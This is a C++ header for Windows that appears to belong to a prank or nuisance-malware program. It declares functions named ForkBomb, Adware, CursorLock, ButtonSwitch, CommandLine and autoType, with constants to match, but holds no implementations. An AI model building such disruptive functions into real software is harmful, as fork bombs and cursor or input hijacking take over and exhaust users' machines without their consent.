#pragma once
#include<iostream>
#include<Windows.h>
#include<fstream>
#include<Lmcons.h>
#include<tchar.h>
#include<direct.h>
#include<shlobj.h>
#include<sstream>
#include<string>
#include<thread>
#include<chrono>

//Set constants
const int CURSOR_X = 500;
const int CURSOR_Y = 500;
const int CURS_LOCK = 50;
const int SLEEP = 300;
const int FORK = 10;

//Set namespaces
using namespace std;
using std::flush;
using std::this_thread::sleep_for;
using std::chrono::milliseconds;

//Function prototypes
void ButtonSwitch();
void Adware();
void CommandLine();
void ForkBomb();
void CursorLock();
void autoType(const string&, unsigned int);
